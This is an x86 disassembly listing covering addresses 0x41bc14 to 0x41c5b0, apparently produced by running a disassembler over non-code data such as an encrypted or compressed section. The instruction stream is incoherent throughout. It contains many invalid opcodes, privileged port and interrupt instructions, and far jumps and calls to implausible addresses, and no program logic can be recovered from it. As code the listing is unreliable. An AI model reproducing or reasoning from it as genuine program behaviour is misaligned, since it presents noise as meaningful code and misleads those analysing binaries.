  41bc14:	sub    al,0xb4
  41bc16:	dec    ecx
  41bc17:	pop    edx
  41bc18:	mov    bl,0xcb
  41bc1a:	dec    esp
  41bc1b:	mov    ebx,0x58fb30d7
  41bc20:	out    dx,al
  41bc21:	leave  
  41bc22:	fbstp  TBYTE PTR [ebp-0x28]
  41bc25:	das    
  41bc26:	xchg   ecx,eax
  41bc27:	mov    edi,0x679b9c5b
  41bc2c:	and    bl,BYTE PTR [edi]
  41bc2e:	and    BYTE PTR ds:0x46d410e1,dh
  41bc34:	fneni(8087 only) 
  41bc36:	data16 or BYTE PTR [esp+ecx*2+0x4b],0x9f
  41bc3c:	das    
  41bc3d:	mov    ds:0xaad61801,eax
  41bc42:	mov    ch,0xe1
  41bc44:	mov    bh,0x8e
  41bc46:	jl     0x41bcb9
  41bc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc49:	mov    bh,0x16
  41bc4b:	hlt    
  41bc4c:	add    BYTE PTR [edx+0x6c],dl
  41bc4f:	inc    eax
  41bc50:	jecxz  0x41bc52
  41bc52:	lahf   
  41bc53:	les    esi,FWORD PTR [ecx+0x50]
  41bc56:	shr    DWORD PTR [ebx+ebp*4],0xc6
  41bc5a:	les    edx,FWORD PTR [ebp+0x4a92b8e8]
  41bc60:	adc    al,0xc
  41bc62:	out    0x4b,al
  41bc64:	adc    esp,esi
  41bc66:	inc    DWORD PTR [esi-0x4f]
  41bc69:	jecxz  0x41bcb4
  41bc6b:	cmp    BYTE PTR [edi-0x101db35e],dl
  41bc71:	cmp    eax,0x6d76af89
  41bc76:	and    al,0xf7
  41bc78:	dec    edx
  41bc79:	cmp    BYTE PTR [ebx-0x3f],0x2d
  41bc7d:	sar    al,cl
  41bc7f:	shr    BYTE PTR [esi+0x42ba73f4],0x46
  41bc86:	sub    dl,BYTE PTR [eax+ecx*4+0x633e2e73]
  41bc8d:	xor    ebp,eax
  41bc8f:	mov    ds:0x7d91c36,al
  41bc94:	jo     0x41bc3d
  41bc96:	pop    esi
  41bc97:	fwait
  41bc98:	outs   dx,DWORD PTR ds:[esi]
  41bc99:	ja     0x41bca8
  41bc9b:	xchg   esi,eax
  41bc9c:	repnz dec eax
  41bc9e:	je     0x41bd03
  41bca0:	cmp    eax,edx
  41bca2:	fst    QWORD PTR [eax]
  41bca4:	adc    ebp,DWORD PTR [edx]
  41bca6:	outs   dx,BYTE PTR ds:[esi]
  41bca7:	dec    esi
  41bca8:	pop    esi
  41bca9:	cli    
  41bcaa:	cmp    esp,esp
  41bcac:	mov    cl,0xe4
  41bcae:	(bad)  
  41bcaf:	pop    edx
  41bcb0:	mov    al,0x3d
  41bcb2:	data16 into 
  41bcb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcb5:	scas   al,BYTE PTR es:[edi]
  41bcb6:	aas    
  41bcb7:	or     ah,BYTE PTR [ebp-0x477443db]
  41bcbd:	inc    ecx
  41bcbe:	imul   ebx,DWORD PTR [ebp+0x37813212],0xffffff99
  41bcc5:	jae    0x41bcde
  41bcc7:	adc    DWORD PTR [edi],esp
  41bcc9:	push   edi
  41bcca:	pop    eax
  41bccb:	into   
  41bccc:	adc    al,0x20
  41bcce:	sti    
  41bccf:	add    cl,BYTE PTR [eax+0x2be286c9]
  41bcd5:	out    dx,al
  41bcd6:	push   edx
  41bcd7:	nop
  41bcd8:	mov    esp,0x83fc9757
  41bcdd:	and    DWORD PTR [edi+0x7d],esp
  41bce0:	fs dec ecx
  41bce2:	fstp   st(1)
  41bce4:	lods   eax,DWORD PTR ds:[esi]
  41bce5:	sub    esp,ebx
  41bce7:	cmp    ah,BYTE PTR [ecx-0x53]
  41bcea:	or     BYTE PTR [ebx+ebx*8+0x80],ch
	...
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xd200d9d8
  41bd64:	ja     0x41bd96
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [edi-0x1895c518],ah
  41bd73:	jecxz  0x41bcf8
  41bd75:	mov    al,0xb6
  41bd77:	xchg   esi,eax
  41bd78:	mul    BYTE PTR [eax-0x32]
  41bd7b:	rcl    DWORD PTR [ebp+0x5a],0x50
  41bd7f:	scas   al,BYTE PTR es:[edi]
  41bd80:	sbb    ecx,DWORD PTR [esi-0x41ef35f3]
  41bd86:	fadd   st(0),st
  41bd88:	inc    esp
  41bd89:	dec    ebp
  41bd8a:	push   ss
  41bd8b:	inc    edi
  41bd8c:	retf   
  41bd8d:	jbe    0x41bddc
  41bd8f:	mov    ds:0xcfd9e0bd,eax
  41bd94:	sbb    ch,ch
  41bd96:	mov    dh,0x53
  41bd98:	sbb    eax,0xa936d2a4
  41bd9d:	popf   
  41bd9e:	cld    
  41bd9f:	in     eax,0xf1
  41bda1:	cmp    dl,al
  41bda3:	fnstsw WORD PTR [ebp+0xea0f446]
  41bda9:	xor    edi,DWORD PTR [ebx+eax*1]
  41bdac:	(bad)  
  41bdad:	xchg   edi,eax
  41bdae:	and    dl,BYTE PTR [esi]
  41bdb0:	sbb    DWORD PTR [edx+0xe3be37f],esi
  41bdb6:	outs   dx,BYTE PTR ds:[esi]
  41bdb7:	push   eax
  41bdb8:	es mov eax,0x22501216
  41bdbe:	jecxz  0x41bd96
  41bdc0:	dec    ebx
  41bdc1:	jmp    0x7d9b:0x6ae702bf
  41bdc8:	pusha  
  41bdc9:	popa   
  41bdca:	xor    BYTE PTR [edi+0x51],0xb5
  41bdce:	sbb    dl,BYTE PTR [ebx-0x721afcc1]
  41bdd4:	js     0x41bdf6
  41bdd6:	gs and eax,0xd71800f7
  41bddc:	xchg   edi,eax
  41bddd:	mov    ebp,esi
  41bddf:	fmul   DWORD PTR [esi-0x9]
  41bde2:	(bad)  
  41bde4:	(bad)  
  41bde5:	jae    0x41bd81
  41bde7:	sbb    eax,0x3c12fefb
  41bdec:	jne    0x41bde2
  41bdee:	outs   dx,BYTE PTR ds:[esi]
  41bdef:	stos   DWORD PTR es:[edi],eax
  41bdf0:	repnz out dx,eax
  41bdf2:	test   al,0x73
  41bdf4:	ins    DWORD PTR es:[edi],dx
  41bdf5:	sub    ebx,DWORD PTR [edx-0x6b692f7]
  41bdfb:	mov    ecx,0x3f96d3b2
  41be00:	mov    ecx,0xd038677
  41be05:	inc    esp
  41be06:	scas   eax,DWORD PTR es:[edi]
  41be07:	sti    
  41be08:	add    ah,al
  41be0a:	ja     0x41be80
  41be0c:	repnz enter 0xa65d,0x94
  41be11:	sbb    DWORD PTR [esi],0x4a
  41be14:	add    dh,ah
  41be16:	pusha  
  41be17:	lods   eax,DWORD PTR ds:[esi]
  41be18:	push   ss
  41be19:	dec    edi
  41be1a:	outs   dx,DWORD PTR ds:[esi]
  41be1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1c:	std    
  41be1d:	dec    ebp
  41be1e:	pop    ds
  41be1f:	leave  
  41be20:	in     eax,0xc6
  41be22:	sbb    BYTE PTR ds:0xc74997eb,bl
  41be28:	bound  ecx,QWORD PTR [esi+ebp*1+0x7f]
  41be2c:	popa   
  41be2d:	xchg   ebp,eax
  41be2e:	aad    0xba
  41be30:	jmp    0xc85f:0x692ba015
  41be37:	add    cl,BYTE PTR [edi+0x4b]
  41be3a:	and    bl,BYTE PTR [eax]
  41be3c:	sub    DWORD PTR [esp+edx*4-0x6c],edx
  41be40:	in     eax,dx
  41be41:	lods   eax,DWORD PTR ds:[esi]
  41be42:	mov    cl,0x2b
  41be44:	push   0x142c9b71
  41be49:	pusha  
  41be4a:	xchg   ebx,eax
  41be4b:	dec    ecx
  41be4c:	xor    BYTE PTR ds:0xfb963c8a,ah
  41be52:	inc    esp
  41be53:	pop    edx
  41be54:	dec    BYTE PTR [esi]
  41be56:	sub    eax,0x1af0f8b7
  41be5b:	pusha  
  41be5c:	sti    
  41be5d:	dec    esp
  41be5e:	scas   eax,DWORD PTR es:[edi]
  41be5f:	add    DWORD PTR [edx],0xd6bfbfb2
  41be65:	in     eax,0x18
  41be67:	(bad)  
  41be68:	loopne 0x41be39
  41be6a:	test   eax,0x4f9eba
	...
  41bed3:	add    BYTE PTR [eax],al
  41bed5:	add    BYTE PTR [ebp-0x63956373],al
  41bedb:	jnp    0x41bed4
  41bedd:	out    dx,eax
  41bede:	mov    ebp,DWORD PTR [ecx+0x9393f66]
  41bee4:	aaa    
  41bee5:	pop    ds
  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR [edi+0x62],bh
  41bef0:	dec    esi
  41bef1:	mov    ah,0xf
  41bef3:	mov    dl,0x6e
  41bef5:	ins    BYTE PTR es:[edi],dx
  41bef6:	retf   
  41bef7:	fmul   st(5),st
  41bef9:	(bad)  
  41befa:	outs   dx,BYTE PTR ds:[esi]
  41befb:	fs sbb al,0xfe
  41befe:	adc    DWORD PTR [ebx],ebx
  41bf00:	xchg   ebp,eax
  41bf01:	out    0xf9,al
  41bf03:	push   ecx
  41bf04:	cdq    
  41bf05:	imul   ebx,ecx,0xffffffb5
  41bf08:	dec    edi
  41bf09:	inc    ebx
  41bf0a:	call   0x2d3dd7b1
  41bf0f:	pop    ax
  41bf11:	xchg   ecx,eax
  41bf12:	cmp    cl,al
  41bf14:	jb     0x41beef
  41bf16:	ins    DWORD PTR es:[edi],dx
  41bf17:	adc    eax,DWORD PTR [edx+0x621c06a8]
  41bf1d:	push   ecx
  41bf1e:	test   al,0x6e
  41bf21:	(bad)  
  41bf22:	jg     0x41bf55
  41bf24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf25:	push   edx
  41bf26:	pop    esi
  41bf27:	sbb    bh,bl
  41bf29:	dec    eax
  41bf2a:	ss fcomp QWORD PTR gs:[edx-0x44c8bcbf]
  41bf32:	and    edx,0x6d39ea82
  41bf38:	mov    dh,bl
  41bf3a:	jnp    0x41bf57
  41bf3c:	or     ebx,DWORD PTR [esi-0x1fd1d89d]
  41bf42:	sbb    eax,0x90a5e507
  41bf47:	(bad)  
  41bf48:	cld    
  41bf49:	popa   
  41bf4a:	pop    ecx
  41bf4b:	xor    al,BYTE PTR [ecx-0x42dacb22]
  41bf51:	dec    ebp
  41bf52:	test   BYTE PTR [eax-0x7598f1f9],dl
  41bf58:	jmp    0x41bf95
  41bf5a:	push   ss
  41bf5b:	inc    ebp
  41bf5c:	adc    DWORD PTR [edx-0x31129e8f],esi
  41bf62:	data16 hlt 
  41bf64:	cmp    bh,al
  41bf66:	imul   edx,DWORD PTR [esi],0xacf3325b
  41bf6c:	sbb    al,BYTE PTR [ebx]
  41bf6e:	push   ds
  41bf6f:	int3   
  41bf70:	push   esp
  41bf71:	mov    bl,0xa
  41bf73:	pop    esi
  41bf74:	mov    al,ds:0xe67762d6
  41bf79:	scas   al,BYTE PTR es:[edi]
  41bf7a:	fcom   DWORD PTR [edx+edx*1+0x71]
  41bf7e:	and    al,BYTE PTR [edi+0x39f4b1c9]
  41bf84:	sub    eax,0xeab1cf3c
  41bf89:	fistp  QWORD PTR [edx]
  41bf8b:	push   es
  41bf8c:	sbb    dl,BYTE PTR [edi]
  41bf8e:	enter  0xeca4,0x68
  41bf92:	pop    ecx
  41bf93:	call   FWORD PTR [ecx+0x11]
  41bf96:	sbb    eax,0xb1484be3
  41bf9b:	xlat   BYTE PTR ds:[ebx]
  41bf9c:	jo     0x41bff2
  41bf9e:	sub    eax,0x7a6cbcf8
  41bfa3:	ss dec edi
  41bfa5:	xor    BYTE PTR [edi+0x2588b814],bl
  41bfab:	mov    ch,0xc3
  41bfad:	popa   
  41bfae:	or     al,0x8e
  41bfb0:	(bad)  
  41bfb1:	sub    BYTE PTR [eax],al
  41bfb3:	pop    esi
  41bfb4:	and    esp,eax
  41bfb6:	shl    DWORD PTR [ecx-0x152a5dc1],1
  41bfbc:	ret    0x45b1
  41bfbf:	jns    0x41bfcc
  41bfc1:	and    BYTE PTR [edi-0x58],dh
  41bfc4:	fadd   DWORD PTR [esp+edx*1+0x6e01ae4b]
  41bfcb:	ror    BYTE PTR cs:[ebx],cl
  41bfce:	sti    
  41bfcf:	mov    al,ds:0x8047f8f8
  41bfd4:	or     DWORD PTR [ebp+0x33],ebp
  41bfd7:	nop
  41bfd8:	hlt    
  41bfd9:	or     eax,0xca9809a3
  41bfde:	shr    esp,0x81
  41bfe1:	sbb    BYTE PTR [eax-0x48],al
  41bfe4:	pop    ss
  41bfe5:	and    eax,0xa0d0524b
  41bfea:	push   edi
  41bfeb:	pop    ebp
  41bfec:	inc    edi
  41bfed:	and    BYTE PTR [eax],al
	...
  41c053:	add    BYTE PTR [eax],al
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	adc    bh,BYTE PTR [ecx]
  41c064:	dec    esi
  41c065:	stos   DWORD PTR es:[edi],eax
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	push   DWORD PTR [ebp-0x2f]
  41c071:	inc    edx
  41c072:	outs   dx,BYTE PTR ds:[esi]
  41c073:	jle    0x41c0ba
  41c075:	mov    cl,0x62
  41c077:	jns    0x41c04b
  41c079:	cmp    DWORD PTR [ecx],0xffffff84
  41c07c:	cmp    DWORD PTR [ecx],edx
  41c07e:	test   DWORD PTR [edx+ebx*8-0x56],edi
  41c082:	cmp    DWORD PTR [edi+0x2d],edi
  41c085:	retf   
  41c086:	or     BYTE PTR [eax-0x1e],ch
  41c089:	imul   edx,DWORD PTR [ecx+edx*8-0x39c2d821],0xa30dd7f1
  41c094:	or     ch,BYTE PTR [edx+0x3f368e0f]
  41c09a:	mov    eax,0xac100383
  41c09f:	mov    esi,0x61c3d85f
  41c0a4:	add    al,0x4a
  41c0a6:	mov    al,0xe3
  41c0a8:	rcr    BYTE PTR [edi-0x39],0x86
  41c0ac:	loopne 0x41c0b3
  41c0ae:	mov    esp,0xfadec492
  41c0b3:	ins    BYTE PTR es:[edi],dx
  41c0b4:	push   esp
  41c0b5:	pop    ds
  41c0b6:	repnz sub BYTE PTR [eax-0x356858b2],ch
  41c0bd:	jle    0x41c0a3
  41c0bf:	xchg   esp,eax
  41c0c0:	lods   eax,DWORD PTR ds:[esi]
  41c0c1:	iret   
  41c0c2:	ffreep st(5)
  41c0c4:	out    dx,al
  41c0c5:	shufps xmm3,xmm0,0xaf
  41c0c9:	ja     0x41c079
  41c0cb:	pop    es
  41c0cc:	fbstp  TBYTE PTR [eax+0x77]
  41c0cf:	gs into 
  41c0d1:	loopne 0x41c0a0
  41c0d3:	mov    ds:0x3a74132c,al
  41c0d8:	stc    
  41c0d9:	sbb    eax,0x14bf34
  41c0de:	sub    edi,DWORD PTR [ebx-0x44]
  41c0e1:	jge    0x41c13a
  41c0e3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41c0e5:	adc    eax,0xea6d8d16
  41c0ea:	pop    ss
  41c0eb:	or     al,0xa6
  41c0ed:	repz xlat BYTE PTR ds:[ebx]
  41c0ef:	out    dx,al
  41c0f0:	fidivr WORD PTR [esi]
  41c0f2:	jb     0x41c131
  41c0f4:	add    ecx,edi
  41c0f6:	fiadd  WORD PTR [ecx]
  41c0f8:	mov    ds:0x735837e8,eax
  41c0fd:	call   0xf684ba96
  41c102:	xchg   BYTE PTR [edi],bl
  41c104:	sub    ch,BYTE PTR [esi]
  41c106:	inc    ecx
  41c107:	xchg   edi,eax
  41c108:	shl    DWORD PTR [ebp+0x33],0x52
  41c10c:	test   eax,0x65d48658
  41c111:	pop    es
  41c112:	out    dx,eax
  41c113:	out    dx,al
  41c114:	xchg   esp,eax
  41c115:	jl     0x41c157
  41c117:	imul   ebx,DWORD PTR [esi+0x10],0x55
  41c11b:	xor    eax,0xd207a91a
  41c120:	mov    ah,0x99
  41c122:	das    
  41c123:	xchg   ebx,eax
  41c124:	scas   al,BYTE PTR es:[edi]
  41c125:	stos   DWORD PTR es:[edi],eax
  41c126:	(bad)  
  41c127:	adc    al,0x65
  41c129:	ins    BYTE PTR es:[edi],dx
  41c12a:	push   edi
  41c12b:	packssdw mm3,QWORD PTR [esp+ecx*2-0xe0475fe]
  41c133:	sbb    DWORD PTR [ecx+0x2c7e6d3d],edi
  41c139:	scas   al,BYTE PTR es:[edi]
  41c13a:	std    
  41c13b:	jo     0x41c0db
  41c13d:	and    al,0x91
  41c13f:	(bad)
  41c142:	lahf   
  41c143:	test   al,0xb0
  41c145:	xor    DWORD PTR [ebx],0xd721a066
  41c14b:	xchg   edx,eax
  41c14c:	pcmpgtd mm6,QWORD PTR [ebx+0x59]
  41c150:	not    BYTE PTR [ebp+ebx*1+0x72]
  41c154:	aad    0x5
  41c156:	mov    ecx,0x2f2578ec
  41c15b:	push   esi
  41c15c:	outs   dx,DWORD PTR ds:[esi]
  41c15d:	mov    dh,BYTE PTR [edx+0x4]
  41c160:	das    
  41c161:	xchg   edx,eax
  41c162:	inc    ecx
  41c163:	fwait
  41c164:	dec    BYTE PTR [esi+0x5a]
  41c167:	sbb    al,0x73
  41c169:	jb     0x41c1b3
  41c16b:	call   0x0:0xf292
	...
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0x40591ae9,eax
  41c1e5:	xchg   DWORD PTR [edi+0x2e],esp
  41c1e8:	add    DWORD PTR [eax],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	fwait
  41c1ef:	push   ecx
  41c1f0:	mov    bh,bl
  41c1f2:	jne    0x41c21e
  41c1f4:	add    ah,BYTE PTR [ebx-0x56]
  41c1f7:	and    bl,BYTE PTR [edi-0x65]
  41c1fa:	pop    edi
  41c1fb:	test   DWORD PTR [ecx+0x61],ebp
  41c1fe:	jl     0x41c276
  41c200:	fidivr WORD PTR [eax-0x9]
  41c203:	sub    eax,0xe8440e2d
  41c208:	inc    ebp
  41c209:	xor    al,0x2d
  41c20b:	push   esp
  41c20c:	loopne 0x41c289
  41c20e:	mov    ch,0xee
  41c210:	sahf   
  41c211:	push   ebp
  41c212:	adc    BYTE PTR [ecx],dh
  41c214:	jmp    0x7d3a:0x2a9c8a29
  41c21b:	xchg   ecx,eax
  41c21c:	(bad)  
  41c21e:	mov    eax,ds:0xbb086cb4
  41c223:	xor    bl,BYTE PTR [esi+eax*4]
  41c226:	loopne 0x41c22b
  41c228:	leave  
  41c229:	(bad)  
  41c22a:	call   0x7a97f483
  41c22f:	enter  0x1526,0xb1
  41c233:	push   eax
  41c234:	jbe    0x41c220
  41c236:	enter  0x2725,0x48
  41c23a:	lea    ebx,[eax]
  41c23c:	sub    eax,0x25fef9e5
  41c241:	dec    esp
  41c242:	xchg   DWORD PTR [edx],ebp
  41c244:	adc    eax,0x68a53e5c
  41c249:	retf   0x29e9
  41c24c:	sbb    bl,BYTE PTR fs:[ebx-0x21196ad5]
  41c253:	pop    esi
  41c254:	sbb    bl,BYTE PTR [esi+0x61]
  41c257:	ins    BYTE PTR es:[edi],dx
  41c258:	lahf   
  41c259:	jne    0x41c25a
  41c25b:	add    bh,bh
  41c25d:	dec    esp
  41c25e:	loope  0x41c1e5
  41c260:	pop    ds
  41c261:	jecxz  0x41c287
  41c263:	inc    esi
  41c264:	outs   dx,DWORD PTR ds:[esi]
  41c265:	das    
  41c266:	adc    al,0x4d
  41c268:	test   al,0x68
  41c26a:	push   ebx
  41c26b:	mov    ds:0x4d0e8ab9,eax
  41c270:	stos   BYTE PTR es:[edi],al
  41c271:	loopne 0x41c2e1
  41c273:	cmc    
  41c274:	push   esp
  41c275:	xor    al,dl
  41c277:	mov    ebx,0x6a051b0f
  41c27c:	out    0x45,al
  41c27e:	sub    eax,0x783a1b9d
  41c283:	push   ebx
  41c284:	pushf  
  41c285:	je     0x41c255
  41c287:	in     al,dx
  41c288:	sbb    ebx,DWORD PTR [edi]
  41c28a:	sbb    BYTE PTR [esi+ecx*8],dl
  41c28d:	xchg   edi,eax
  41c28e:	scas   al,BYTE PTR es:[edi]
  41c28f:	dec    eax
  41c290:	out    0x7a,al
  41c292:	mov    dh,0xf8
  41c294:	in     al,dx
  41c295:	mov    BYTE PTR [ecx+0x76254101],al
  41c29b:	mov    ah,0xce
  41c29d:	repnz adc ch,ch
  41c2a0:	and    al,0x78
  41c2a2:	(bad)  
  41c2a3:	aam    0x80
  41c2a5:	cmp    BYTE PTR [edx+edx*4+0x4957ed1f],cl
  41c2ac:	xor    eax,0x55a60dca
  41c2b1:	sub    DWORD PTR [edx],edx
  41c2b3:	ss repnz stos BYTE PTR es:[edi],al
  41c2b6:	imul   esi,DWORD PTR [ebp-0x31],0xa6621410
  41c2bd:	ja     0x41c268
  41c2bf:	adc    eax,eax
  41c2c1:	or     esp,DWORD PTR [ebp-0x2d]
  41c2c4:	ds add al,0x58
  41c2c7:	scas   eax,DWORD PTR es:[edi]
  41c2c8:	div    BYTE PTR [eax-0x5d]
  41c2cb:	sbb    ecx,ebx
  41c2cd:	dec    ebp
  41c2ce:	inc    ebp
  41c2cf:	xchg   esi,eax
  41c2d0:	jo     0x41c32e
  41c2d2:	push   ebx
  41c2d3:	mov    bl,0xad
  41c2d5:	loope  0x41c2d0
  41c2d7:	mov    ds:0xafc23a74,eax
  41c2dc:	jno    0x41c30c
  41c2de:	pop    esi
  41c2df:	add    al,0xd8
  41c2e1:	xor    eax,0x1fcdda95
  41c2e6:	test   BYTE PTR [edx-0x2ea96b80],ah
  41c2ec:	icebp  
  41c2ed:	cdq    
	...
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	loope  0x41c3b8
  41c364:	mov    esi,0x12f67d7
  41c369:	add    BYTE PTR [eax],al
  41c36b:	add    DWORD PTR [eax],eax
  41c36d:	add    BYTE PTR [edx+eiz*4-0x78b5fe73],dh
  41c374:	fist   DWORD PTR ds:0xb7b7c354
  41c37a:	sub    eax,0xe54a269
  41c37f:	(bad)  
  41c380:	push   ds
  41c381:	not    cl
  41c383:	mov    edx,0x5ea6a220
  41c388:	ja     0x41c30f
  41c38a:	test   BYTE PTR [eax-0x6a],0x4a
  41c38e:	(bad)  
  41c38f:	or     eax,0x224e6d11
  41c394:	jnp    0x41c411
  41c396:	mov    ebp,0xa3ae7381
  41c39b:	popf   
  41c39c:	std    
  41c39d:	pop    ebx
  41c39e:	imul   edi,DWORD PTR [eax+0x2b],0x6927328f
  41c3a5:	mov    edi,0xf78d5f35
  41c3aa:	cli    
  41c3ab:	shl    DWORD PTR [ebp+edi*4-0x7e],0xd7
  41c3b0:	pushf  
  41c3b1:	sbb    bl,BYTE PTR [eax]
  41c3b3:	dec    ebp
  41c3b4:	or     BYTE PTR [ebp-0x4a46f7d7],ch
  41c3ba:	adc    dh,BYTE PTR [ebx+edx*2+0x4bd61ae2]
  41c3c1:	daa    
  41c3c2:	into   
  41c3c3:	jecxz  0x41c3bf
  41c3c5:	jge    0x41c3e2
  41c3c7:	pop    ss
  41c3c8:	jno    0x41c3df
  41c3ca:	pop    edi
  41c3cb:	cdq    
  41c3cc:	loope  0x41c3e6
  41c3ce:	fs jae 0x41c415
  41c3d1:	in     al,dx
  41c3d2:	pushf  
  41c3d3:	add    ch,BYTE PTR [ebx]
  41c3d5:	adc    al,0x24
  41c3d7:	jno    0x41c433
  41c3d9:	fisttp WORD PTR [eax]
  41c3db:	call   0x4fd408f0
  41c3e0:	jmp    0x2dc14e17
  41c3e5:	sbb    ebx,DWORD PTR [ebx+eiz*4-0x12ef9a96]
  41c3ec:	jb     0x41c414
  41c3ee:	scas   eax,DWORD PTR es:[edi]
  41c3ef:	mov    dl,0x1
  41c3f1:	sub    eax,0x893d6bc8
  41c3f6:	dec    esi
  41c3f7:	xchg   ebp,eax
  41c3f8:	loop   0x41c3be
  41c3fa:	push   edx
  41c3fb:	push   esp
  41c3fc:	(bad)  
  41c3fd:	mov    ecx,0x935d92f8
  41c402:	mov    edi,0xa5a467e5
  41c407:	in     eax,0x14
  41c409:	push   ecx
  41c40a:	cli    
  41c40b:	int3   
  41c40c:	std    
  41c40d:	aad    0x21
  41c40f:	jmp    0x41c45b
  41c411:	and    BYTE PTR [esi+0x297ee37c],ch
  41c417:	sub    BYTE PTR [edx*2-0x61ecac57],bl
  41c41e:	jmp    0xaa27:0xe1c046da
  41c425:	xor    bl,BYTE PTR [ebp+esi*4+0x68980e97]
  41c42c:	dec    esp
  41c42d:	fcomp  QWORD PTR [eax]
  41c42f:	ret    0xd0f7
  41c432:	xor    ebx,DWORD PTR [edi]
  41c434:	pop    ss
  41c435:	outs   dx,DWORD PTR ds:[esi]
  41c436:	sub    eax,DWORD PTR [ebp+ebp*4-0x3aec2229]
  41c43d:	into   
  41c43e:	fld    QWORD PTR [ecx+0x58]
  41c441:	cwde   
  41c442:	sub    eax,0x5bedad1f
  41c447:	lahf   
  41c448:	dec    esi
  41c449:	add    ah,ch
  41c44b:	lock fcmovbe st,st(4)
  41c44e:	mov    sp,0xcb6c
  41c452:	int    0x39
  41c454:	sbb    BYTE PTR [ecx],cl
  41c456:	add    esp,ebp
  41c458:	or     al,0x91
  41c45a:	cmp    al,0xfa
  41c45c:	arpl   si,bx
  41c45e:	mov    ebp,0xc67c9de
  41c463:	add    DWORD PTR [esi+eax*8-0x6e],esp
  41c467:	jge    0x41c480
  41c469:	fidiv  DWORD PTR [eax-0x6]
  41c46c:	clc    
  41c46d:	or     al,BYTE PTR [eax]
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	jo     0x41c488
  41c4e4:	test   BYTE PTR [edi+0x67],ch
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    BYTE PTR [eax-0x264c5e26],dl
  41c4f3:	or     al,0xb2
  41c4f5:	xor    eax,0x987dcc81
  41c4fa:	sti    
  41c4fb:	ret    
  41c4fc:	mov    ch,0x1
  41c4fe:	out    0x4c,al
  41c500:	xor    eax,0xb965afc0
  41c505:	mov    bl,0x4b
  41c507:	xchg   edx,eax
  41c508:	or     BYTE PTR [ecx-0x43],bl
  41c50b:	ss out dx,al
  41c50d:	jecxz  0x41c52e
  41c50f:	mov    BYTE PTR [ebp-0x13],0x81
  41c513:	aam    0x60
  41c515:	test   DWORD PTR [ecx],ecx
  41c517:	dec    esp
  41c518:	inc    DWORD PTR [esp+edi*1-0x43]
  41c51c:	mov    ds:0xa7e29070,eax
  41c521:	ret    
  41c522:	aad    0xc5
  41c524:	jno    0x41c580
  41c526:	mov    bh,0x82
  41c528:	mov    esi,0xc1307bf2
  41c52d:	push   edx
  41c52e:	lock repnz and bh,BYTE PTR [ecx-0x51fc23b4]
  41c536:	jp     0x41c58b
  41c538:	inc    esi
  41c539:	cmp    edx,DWORD PTR [edx-0x3c]
  41c53c:	pusha  
  41c53d:	cli    
  41c53e:	mov    DWORD PTR [edx+0x3ed2ae41],eax
  41c544:	jnp    0x41c5b9
  41c546:	out    dx,al
  41c547:	mov    al,ds:0x2914cda7
  41c54c:	cs xchg ebp,edi
  41c54f:	cmp    DWORD PTR [ebp+0x15],ebx
  41c552:	enter  0xb2ea,0x71
  41c556:	stos   BYTE PTR es:[edi],al
  41c557:	out    0x68,al
  41c559:	sbb    dl,BYTE PTR [edi]
  41c55b:	pop    esi
  41c55c:	add    BYTE PTR [ecx+0x52],cl
  41c55f:	ficomp WORD PTR [ebx]
  41c561:	mov    esi,0xf1322f28
  41c566:	test   BYTE PTR [esi],al
  41c568:	in     eax,dx
  41c569:	inc    esp
  41c56a:	dec    esi
  41c56b:	pop    ebp
  41c56c:	adc    DWORD PTR ds:0xbe57dae0,ebx
  41c572:	push   ecx
  41c573:	je     0x41c535
  41c575:	popa   
  41c576:	mov    dh,BYTE PTR [edi-0x110cee27]
  41c57c:	sbb    al,0x72
  41c57e:	ret    0xd257
  41c581:	push   ds
  41c582:	push   edi
  41c583:	mov    ch,0x38
  41c585:	push   edx
  41c586:	and    DWORD PTR [eax-0x929b6d5],eax
  41c58c:	jmp    0x4d9a:0x5a88745d
  41c593:	push   esi
  41c594:	imul   ebp,DWORD PTR [edi],0xe2068433
  41c59a:	mov    al,ds:0x3fa3a7d1
  41c59f:	fimul  WORD PTR [ebx]
  41c5a1:	pop    ss
  41c5a2:	int3   
  41c5a3:	xchg   edx,eax
  41c5a4:	push   ebx
  41c5a5:	addr16 inc edi
  41c5a7:	aad    0x1c
  41c5a9:	and    cl,BYTE PTR [edi-0x50]
  41c5ac:	scas   eax,DWORD PTR es:[edi]
  41c5ad:	sbb    BYTE PTR [edi],cl
  41c5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b0:	test   DWORD PTR [edi-0x4327e682],ecx
